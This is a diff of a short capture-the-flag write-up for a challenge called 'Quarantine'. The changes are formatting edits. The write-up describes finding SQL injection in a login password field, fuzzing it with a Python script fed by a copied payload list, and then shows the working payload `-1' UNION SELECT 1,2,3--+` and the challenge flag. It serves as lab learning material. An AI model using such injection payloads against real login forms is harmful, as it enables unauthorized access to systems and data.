@@ -1,14 +1,14 @@
 # Quarantine
 
-After testing on the website I found that entering `'` in the password field gave a 500 error
+After testing on the website I found that entering `'` in the password field gave a 500 error.
 
 Yesss - SQL Injection!
 
-I then copied a load of sql injection payloads from https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b into a text file
+I then copied a load of sql injection payloads from [here](https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b) into a text file
 
 ## Writing a python script to test all the payloads
 
-```
+```python
 import requests
 import re
 
@@ -31,10 +31,6 @@ for payload in Payloads:
 $ python3 exploit.py 
 -1' UNION SELECT 1,2,3--+
 ```
-Enter the payload into the password field and you meet the flag
+Enter the payload into the password field and you get the flag.
 
-ractf{Y0u_B3tt3r_N0t_h4v3_us3d_sqlm4p}
-
-
-
-
+**ractf{Y0u_B3tt3r_N0t_h4v3_us3d_sqlm4p}**
